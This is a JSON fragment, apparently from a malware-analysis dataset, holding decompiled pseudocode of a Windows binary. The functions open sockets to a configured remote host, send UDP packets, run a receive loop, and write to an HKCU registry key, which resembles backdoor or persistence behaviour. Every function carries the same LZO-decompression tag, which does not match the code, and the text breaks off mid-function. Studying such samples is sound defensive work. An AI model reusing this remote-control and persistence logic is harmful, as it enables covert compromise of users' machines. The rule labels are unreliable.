        "decompiled_code": "\nvoid __fastcall fcn.00480a28(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x480a3b;\n    fcn.004059cc();\n    uStack24 = 0x480a9b;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    piVar1 = fcn.00404620();\n    *(in_EAX + 0x40) = piVar1;\n    (**(*piVar1 + 0x44))();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 < 1) {\n        *(in_EAX + 0x48) = 0xffffffff;\n    }\n    else {\n        (**(**(in_EAX + 0x40) + 0x2c))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x480aa2;\n    uStack24 = 0x480a9a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 312
    },
    "00480fd8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00481035)\n// WARNING: Removing unreachable block (ram,0x00481060)\n// WARNING: Removing unreachable block (ram,0x0048103d)\n// WARNING: Removing unreachable block (ram,0x00481068)\n\nvoid fcn.00480fd8(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x4810e3;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fVar1 = fcn.0040bd00();\n    fcn.0040bbe8(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fVar1 = fcn.0040bd00();\n    fcn.0040bc78(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fcn.00409d78();\n    fcn.00409d78();\n    fcn.00409d78();\n    fcn.00409d78(0x481104, 0, 0x481104, 0, 0x481104, 0);\n    uVar2 = 0x481110;\n    fcn.004058e0(0x481110, 0);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x4810ea);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 391
    },
    "004815e8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004815e8(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    float10 fVar6;\n    ulong uVar7;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff40;\n    int32_t iVar8;\n    uint uStack168;\n    uint uStack164;\n    uchar *puStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0xd;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    _var_20h = CONCAT44(0x481606, var_20h);\n    fcn.004059cc();\n    _var_20h = CONCAT44(&stack0xfffffffc, 0x481993);\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004815e8::var_24h;\n    _var_28h = CONCAT44(uVar1, &stack0xfffffffc);\n    var_2ch = 0x481957;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004815e8::var_30h;\n    uVar5 = **0x4958f8 == 1;\n    if (!uVar5) {\n        var_34h = NULL;\n    // WARNING: Subroutine does not return\n        var_38h = 0x481633;\n        sub.kernel32.dll_ExitThread_1();\n    }\n    var_34h = 0x48163b;\n    fcn.00481240();\n    var_34h = 0x481649;\n    fcn.00405974();\n    if (uVar5) goto code_r0x0048192f;\n    var_34h = 0x481657;\n    fcn.00480fd8();\n    var_34h = 0x481664;\n    fcn.00405974();\n    if (!uVar5) {\n        var_38h = 0x481691;\n        var_3ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004815e8::var_3ch;\n        var_40h = 0x481682;\n        var_34h = &stack0xfffffffc;\n        fcn.00403918();\n        var_40h = 0x481687;\n        fcn.0040305c();\n        *in_FS_OFFSET = var_3ch;\n        var_34h = 0x4816a8;\n        fcn.0048b61c();\n        var_38h = 0x4819ac;\n        var_3ch = 0x4816b8;\n        fcn.00480fd8();\n        var_3ch = var_38h;\n        var_40h = 0x4816c8;\n        fcn.004058e0();\n        var_40h = 0x4816d5;\n        fcn.00403770();\n        var_40h = 0x4816dd;\n        fcn.00480fd8();\n        var_40h = 0x4816ea;\n        fcn.00405584();\n    }\n    var_40h = 0x4816f7;\n    fcn.0048b61c();\n    var_40h = var_44h;\n    var_44h = 0x4819ac;\n    var_48h = 0x481707;\n    fcn.00480fd8();\n    var_4ch = 0x481717;\n    fcn.004058e0();\n    var_4ch = 0x48171f;\n    cVar2 = fcn.0040a274();\n    uVar5 = cVar2 == '\\0';\n    if (uVar5) {\n        var_4ch = 0x48173e;\n        fcn.00403500();\n        var_4ch = 0x481743;\n        fcn.0040305c();\n    }\n    else {\n        var_4ch = 0x48172d;\n        fcn.0040350c();\n        var_4ch = 0x481732;\n        fcn.0040305c();\n    }\n    var_4ch = 0x481748;\n    fVar6 = fcn.0040bccc();\n    _var_20h = fVar6;\n    var_1ch = _var_20h >> 0x20;\n    var_4ch = var_1ch;\n    var_50h = var_20h;\n    var_54h = 0x481762;\n    fcn.0040c900();\n    var_54h = 0x4819bc;\n    var_58h = *0x495770;\n    var_5ch = 0x4819c8;\n    var_64h = 0x4819d4;\n    var_68h = 0x4819e0;\n    var_6ch = *0x495778;\n    uStack116 = 0x4819e0;\n    uStack120 = 0x481797;\n    fcn.004058e0();\n    uStack120 = 0x4817a4;\n    fcn.00405cd0();\n    uStack120 = 0x4817a9;\n    fcn.004040ac();\n    uStack120 = 0x4817ae;\n    fcn.0040305c();\n    uStack120 = 0x4817b6;\n    fcn.00481380();\n    uStack120 = 0x4817c4;\n    fcn.00405974();\n    if (!uVar5) {\n        var_50h = *0x495780;\n        uStack120 = 0x4817e3;\n        fVar6 = fcn.0040bccc();\n        _var_28h = fVar6;\n        var_24h = _var_28h >> 0x20;\n        uStack120 = var_24h;\n        uStack124 = var_28h;\n        uStack128 = 0x4817fd;\n        fcn.0040c900();\n        uStack128 = 0x4819ec;\n        uStack132 = 0x48180c;\n        fcn.00409d78();\n        uStack132 = var_58h;\n        uStack136 = 0x481a14;\n        uStack144 = 0x4819d4;\n        uStack148 = 0x4819e0;\n        uStack152 = *0x495780;\n        uStack156 = 0x4819e0;\n        puStack160 = 0x481839;\n        fcn.004058e0();\n        puStack160 = 0x481846;\n        fcn.00405cd0();\n        puStack160 = 0x48184b;\n        fcn.004040ac();\n        puStack160 = 0x481850;\n        fcn.0040305c();\n        puStack160 = 0x48185d;\n        fcn.00405584();\n        uVar5 = 1;\n        uStack164 = 0x48190c;\n        uStack168 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff58;\n        puStack160 = &stack0xfffffffc;\n        fcn.00473610();\n        fcn.00405974();\n        if (uVar5) {\n            fcn.0048b61c();\n            fcn.00480fd8(0x4819ac, var_64h);\n            fcn.004058e0(var_68h);\n            uVar7 = fcn.004812bc();\n            fcn.00473610();\n            in_stack_ffffff40 = 0x4818d3;\n            iVar3 = fcn.00409ee4();\n            iVar8 = uVar7 >> 0x20;\n            iVar4 = (iVar3 << 10) >> 0x1f;\n            if (iVar4 == iVar8) {\n                if (iVar3 << 10 < uVar7) {\ncode_r0x004818ea:\n                    in_stack_ffffff40 = 0;\n                    in_stack_ffffff34 = 0;\n                    sub.kernel32.dll_CreateThread_1(0, 0, fcn.004813a4, 0, 0, *0x495c30);\n                }\n            }\n            else if (iVar4 < iVar8) goto code_r0x004818ea;\n        }\n        *in_FS_OFFSET = in_stack_ffffff34;\n    }\n    fcn.00403918();\n    fcn.0040305c();\n    fcn.00405530();\ncode_r0x0048192f:\n    fcn.00405818();\n    *in_FS_OFFSET = in_stack_ffffff40;\n    fcn.00405584(0x48195e);\n    return;\n}\n",
        "token_count": 2260
    },
    "00482470": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00482470 noreturn (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack1084;\n    uint uStack1080;\n    uchar *puStack1076;\n    uint var_420h;\n    uint var_41ch;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack1076 = &stack0xfffffffc;\n    var_420h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack1080 = 0x4825d2;\n    uStack1084 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1084;\n    fcn.00405728();\n    fcn.00405b28(&var_420h);\n    fcn.00405a44();\n    uVar1 = fcn.004059dc();\n    fcn.00405b28();\n    fcn.00405a84();\n    uVar2 = fcn.00409ee4();\n    fcn.00482394();\n    iVar3 = sub.wsock32.dll_socket(2, 2, 0);\n    if (iVar3 < 0) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    fcn.00403af4();\n    var_1ch._0_2_ = 2;\n    var_18h = sub.wsock32.dll_inet_addr(uVar1);\n    var_1ch._2_2_ = sub.wsock32.dll_htons(uVar2);\n    if (var_18h == -1) {\n        iVar4 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar4 == 0) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        var_18h = ***(iVar4 + 0xc);\n    }\n    iVar4 = var_4h;\n    if (var_4h != 0) {\n        iVar4 = *(var_4h + -4);\n    }\n    sub.wsock32.dll_sendto(iVar3, &var_4h, iVar4, 0, &var_1ch, 0x10);\n    fcn.00405728();\n    sub.kernel32.dll_Sleep_2(1000);\n    sub.wsock32.dll_closesocket(iVar3);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 629
    },
    "00482780": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00482780(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint buf;\n    uint s;\n    int32_t var_4h;\n    \n    puStack1048 = 0x482799;\n    s = in_EAX;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack1052 = 0x482812;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    fcn.00403af4();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        puVar1 = &fcn.00482780::buf;\n        do {\n            *puVar1 = *(var_4h + iVar3);\n            iVar3 = iVar3 + 1;\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    sub.wsock32.dll_send(s, &fcn.00482780::buf, 0x400, 0);\n    *in_FS_OFFSET = s;\n    fcn.00405530(0x482819);\n    return;\n}\n",
        "token_count": 373
    },
    "004835dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004835dc(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint phkResult;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x4835f3;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack32 = 0x4835fb;\n    fcn.004059cc();\n    uStack36 = 0x483696;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48366a;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    sub.advapi32.dll_RegOpenKeyA(0x80000001, 0x4836a4, &fcn.004835dc::phkResult);\n    iVar2 = var_8h;\n    if (var_8h != 0) {\n        iVar2 = *(var_8h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2 + 1);\n    uVar3 = 0;\n    uVar1 = fcn.004059dc(0, 1, uVar1);\n    sub.advapi32.dll_RegSetValueExA(phkResult, uVar1);\n    sub.advapi32.dll_RegCloseKey_1();\n    *in_FS_OFFSET = phkResult;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x48369d);\n    return;\n}\n",
        "token_count": 438
    },
    "004836d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004836d4(void)\n\n{\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t in_stack_ffffffbc;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    puStack32 = 0x4836eb;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    uStack36 = 0x4837e2;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x4837b6;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    fcn.004216b4();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00422014();\n    uVar1 = var_8h == 0 || var_8h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar1) {\n        fcn.00405818();\n        var_4h = in_stack_ffffffbc;\n    }\n    else {\n        fcn.004058e0(var_4h, 0x48384c, var_8h);\n    }\n    fcn.00421fb4();\n    fcn.00404650();\n    *in_FS_OFFSET = var_4h;\n    *in_FS_OFFSET = &fcn.004836d4::var_ch;\n    uStack48 = 0x4837e9;\n    iStack52 = 0x4837e1;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 465
    },
    "004844c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004844c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack24 = 0x4844db;\n    fcn.004059cc();\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (0 < iVar2) {\n        do {\n    // switch table (55 cases) at 0x484563\n            switch(*(in_EAX + -1 + iVar2)) {\n            case 0x30:\n                break;\n            case 0x31:\n                break;\n            case 0x32:\n                break;\n            case 0x33:\n                break;\n            case 0x34:\n                break;\n            case 0x35:\n                break;\n            case 0x36:\n                break;\n            case 0x37:\n                break;\n            case 0x38:\n                break;\n            case 0x39:\n                break;\n            case 0x41:\n                break;\n            case 0x42:\n                break;\n            case 0x43:\n                break;\n            case 0x44:\n                break;\n            case 0x45:\n                break;\n            case 0x46:\n                break;\n            case 0x61:\n                break;\n            case 0x62:\n                break;\n            case 99:\n                break;\n            case 100:\n                break;\n            case 0x65:\n                break;\n            case 0x66:\n            }\n            iVar1 = in_EAX;\n            if (in_EAX != 0) {\n                iVar1 = *(in_EAX + -4);\n            }\n            if (iVar1 != iVar2) {\n                iVar1 = in_EAX;\n                if (in_EAX != 0) {\n                    iVar1 = *(in_EAX + -4);\n                }\n                if (0 < iVar1) {\n                    do {\n                        iVar1 = iVar1 + -1;\n                    } while (iVar1 != 0);\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    uStack24 = 0x4846bf;\n    uStack28 = 0x4846b7;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 587
    },
    "00484f80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00484f80(void)\n\n{\n    uint *in_EAX;\n    uint arg_8h;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_130h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_114h;\n    uint uStackY156;\n    uint uStackY152;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar1 = 0x2b;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puVar3 = &fcn.00484f80::var_138h;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    for (iVar1 = 0x4a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *in_EAX;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    uStack32 = 0x485165;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.00405530();\n    for (uVar2 = 0; *(&fcn.00484f80::var_114h + (uVar2 & 0xff)) != '\\0'; uVar2 = uVar2 + 1) {\n        fcn.00405718();\n        fcn.00405818();\n    }\n    fcn.00484b24();\n    fcn.00484bb4();\n    if (var_8h != 0) {\n        var_8h = *(var_8h + -4);\n    }\n    if (var_8h == 0) {\n        fcn.004055c8();\n    }\n    if (var_ch != 0) {\n        var_ch = *(var_ch + -4);\n    }\n    if (var_ch == 0) {\n        fcn.004055c8();\n    }\n    fcn.00484ec8();\n    fcn.00409e64(var_124h);\n    fcn.00409e64(var_130h);\n    fcn.00409e64(var_10h);\n    fcn.00409e64(var_120h);\n    fcn.00484d64();\n    arg_8h = sub.kernel32.dll_GetCurrentProcessId();\n    uStackY152 = 0x485128;\n    fcn.00409e64(arg_8h);\n    uStackY152 = var_158h;\n    uStackY156 = 0x48513a;\n    fcn.004058e0();\n    *in_FS_OFFSET = uStackY152;\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 806
    },
    "00486bb4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00486c08)\n\nvoid fcn.00486bb4(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x486c6a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.004055c8();\n    fcn.00461360();\n    fcn.004055c8();\n    iVar3 = 0;\n    bVar1 = false;\n    while (bVar1) {\n        fcn.00405a3c(iVar3, 0);\n        uStack44 = *(in_EAX + 0x40);\n        iVar2 = sub.wsock32.dll_send();\n        if (iVar2 < 1) break;\n        iVar3 = iVar3 - iVar2;\n        bVar1 = 0 < iVar3;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x486c71;\n    uStack40 = 0x486c61;\n    fcn.00405530();\n    uStack40 = 0x486c69;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 341
    },
    "00486e20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00487087)\n// WARNING: Removing unreachable block (ram,0x00487098)\n\nvoid fcn.00486e20(void)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack4196;\n    int32_t iStack4192;\n    uchar *puStack4188;\n    uint name;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4188 = &stack0xfffffffc;\n    iVar3 = 2;\n    do {\n        iVar2 = iVar3;\n        iVar3 = iVar2 + -1;\n    } while (iVar3 != 0);\n    iStack4192 = 0x487114;\n    iStack4196 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef9c;\n    iVar3 = 0;\ncode_r0x00486e6b:\n    do {\n        iVar4 = (**(***0x495808 + 0x14))();\n        if (iVar4 + -1 < iVar3) {\n            iVar3 = 0;\n        }\n        fcn.00465100();\n        iVar4 = fcn.004059dc();\n        **0x495b34 = iVar4;\n        uVar1 = fcn.00465024();\n        **0x4959d8 = uVar1;\n        iVar3 = iVar3 + 1;\n        sub.kernel32.dll_Sleep_2();\n        while (iVar4 = sub.user32.dll_PeekMessageA(),  iVar4 != 0) {\n            sub.user32.dll_TranslateMessage();\n            sub.user32.dll_DispatchMessageA();\n        }\n        fcn.00403af4();\n        iStack4196 = 2;\n        iVar4 = sub.wsock32.dll_socket();\n        **0x495af4 = iVar4;\n    } while (**0x495af4 == -1);\n    sub.wsock32.dll_htons();\n    iVar4 = sub.wsock32.dll_inet_addr();\n    if (iVar4 == -1) goto code_r0x00486f57;\n    goto code_r0x00486f76;\ncode_r0x00486f57:\n    iStack4196 = **0x495b34;\n    iVar4 = sub.wsock32.dll_gethostbyname();\n    if (iVar4 != 0) {\ncode_r0x00486f76:\n        iVar4 = **0x495af4;\n        puStack4188 = 0x486f89;\n        iVar5 = sub.wsock32.dll_connect();\n        if (iVar5 == 0) {\n            if (unaff_ESI != 0) {\n                puStack4188 = 0x486f9c;\n                fcn.0041fec4();\n            }\n            puStack4188 = 0x486faa;\n            unaff_ESI = fcn.0041f9e0();\n            *(unaff_ESI + 0xf) = 1;\n            puStack4188 = 0x486fb9;\n            fcn.0041fbec();\n            puStack4188 = 0x486fc8;\n            fcn.00486cf4();\n            puStack4188 = 0x486fd1;\n            fcn.00486cf8();\n            puStack4188 = 0x486fd8;\n            fcn.0041fe9c();\n            **0x495a78 = 1;\n            while( true ) {\n                if (*(iVar2 + 0xd) != '\\0') {\n                    *in_FS_OFFSET = iVar4;\n                    fcn.00405530();\n                    fcn.00405d40();\n                    fcn.00405530();\n                    fcn.00405530();\n                    return;\n                }\n                puStack4188 = 0x486ff7;\n                fcn.00403af4();\n                puStack4188 = NULL;\n                iStack4192 = 0x2000;\n                iStack4196 = **0x495af4;\n                iVar5 = sub.wsock32.dll_recv();\n                if (iVar5 < 1) break;\n                fcn.00405e3c();\n                fcn.00409bd8();\n                fcn.004057d4();\n                fcn.0046163c();\n                fcn.004055c8();\n            }\n            fcn.00486d68();\n        }\n        else {\n            if (unaff_ESI != 0) {\n                puStack4188 = 0x4870b7;\n                fcn.0041fec4();\n            }\n            puStack4188 = 0x1;\n            iStack4192 = **0x495af4;\n            iStack4196 = 0x4870c6;\n            sub.wsock32.dll_shutdown();\n            iStack4196 = **0x495af4;\n            sub.wsock32.dll_closesocket();\n        }\n    }\n    goto code_r0x00486e6b;\n}\n",
        "token_count": 1125
    },
    "00488d5c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00488d5c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack8264;\n    uint uStack8260;\n    uint uStack8256;\n    uint uStack8252;\n    uint uStack8248;\n    uint uStack8244;\n    uint uStack8240;\n    ushort uStack8236;\n    ushort uStack8234;\n    int32_t iStack8232;\n    uint auStack8220 [986];\n    uint uStack4276;\n    uint uStack4272;\n    uint *puStack4268;\n    uint *puStack4264;\n    uint *puStack4260;\n    uint *puStack4256;\n    uint *puStack4252;\n    uchar *puStack4248;\n    int32_t iStack4244;\n    uchar *puStack4240;\n    uchar *puStack4236;\n    uint uStack4232;\n    uchar *puStack4228;\n    uchar *puStack4224;\n    uint uStack4220;\n    uint uStack4216;\n    uint uStack4212;\n    uint32_t uStack4208;\n    uint uStack4204;\n    uint uStack4200;\n    uint uStack4196;\n    int32_t iStack4192;\n    uint uStack4188;\n    uchar *puStack4184;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4184 = &stack0xfffffffc;\n    iVar2 = 2;\n    do {\n        iVar1 = iVar2;\n        iVar2 = iVar1 + -1;\n    } while (iVar1 + -1 != 0);\n    uStack8264 = 0;\n    uStack8260 = 0;\n    uStack8256 = 0;\n    uStack8252 = 0;\n    uStack8248 = 0;\n    uStack8240 = 0;\n    uStack8244 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    uStack4188 = 0x489183;\n    iStack4192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefa0;\n    uStack4196 = 0;\n    uStack4200 = 1;\n    uStack4204 = 2;\n    uStack4208 = 0x488dc6;\n    iVar2 = sub.wsock32.dll_socket();\n    *(iVar1 + 0x44) = iVar2;\n    if (iVar2 != -1) {\n        uStack8236 = 2;\n        uStack4208 = **0x4959d8;\n        uStack4212 = 0x488dec;\n        uStack8234 = sub.wsock32.dll_htons();\n        uStack4212 = **0x495b34;\n        uStack4216 = 0x488e00;\n        iStack8232 = sub.wsock32.dll_inet_addr();\n        if (iStack8232 == -1) {\n            uStack4216 = **0x495b34;\n            uStack4220 = 0x488e18;\n            iVar2 = sub.wsock32.dll_gethostbyname();\n            if (iVar2 == 0) goto code_r0x0048913e;\n            iStack8232 = ***(iVar2 + 0xc);\n        }\n        uStack4220 = 0x10;\n        puStack4224 = &stack0xffffdfd4;\n        puStack4228 = *(iVar1 + 0x44);\n        uStack4232 = 0x488e42;\n        sub.wsock32.dll_connect();\n        uStack4232 = 0;\n        puStack4236 = 0x2000;\n        puStack4240 = &stack0xffffdfe4;\n        uStack4216 = *(iVar1 + 0x44);\n        puStack4248 = 0x488e5c;\n        iVar2 = sub.wsock32.dll_recv();\n        if (iVar2 != -1) {\n            puStack4248 = 0x488e74;\n            fcn.00409d78();\n            puStack4248 = 0x488e8a;\n            fcn.00405864();\n            puStack4248 = 0x488e9b;\n            fcn.00475e38();\n            puStack4248 = NULL;\n            puStack4252 = 0x2000;\n            puStack4256 = &stack0xffffdfe4;\n            uStack4216 = *(iVar1 + 0x44);\n            puStack4264 = 0x488eb5;\n            iVar2 = sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                while (*(iVar1 + 0xd) == '\\0') {\n                    uStack4220 = 0x488ed0;\n                    fcn.00403af4();\n                    uStack4220 = 0x488ee2;\n                    fcn.00403af4();\n                    uStack4220 = 0;\n                    puStack4224 = 0x2000;\n                    puStack4228 = &stack0xffffdfe4;\n                    uStack4216 = *(iVar1 + 0x44);\n                    puStack4236 = 0x488efc;\n                    iVar2 = sub.wsock32.dll_recv();\n                    if (iVar2 < 1) break;\n                    uVar3 = 1;\n                    puStack4240 = 0x489127;\n                    iStack4244 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffef6c;\n                    puStack4248 = 0x488f22;\n                    puStack4236 = &stack0xfffffffc;\n                    fcn.00405728();\n                    puStack4248 = &stack0xffffdfc8;\n                    puStack4252 = 0x488f3b;\n                    fcn.00405a44();\n                    puStack4252 = 0x488f4b;\n                    fcn.00405974();\n                    if (uVar3) {\n                        puStack4252 = &fcn.00488d5c::var_8h;\n                        puStack4256 = 0x488f6f;\n                        fcn.00405a44();\n                        puStack4256 = NULL;\n                        puStack4260 = 0x488f79;\n                        puStack4260 = fcn.00409ee4();\n                   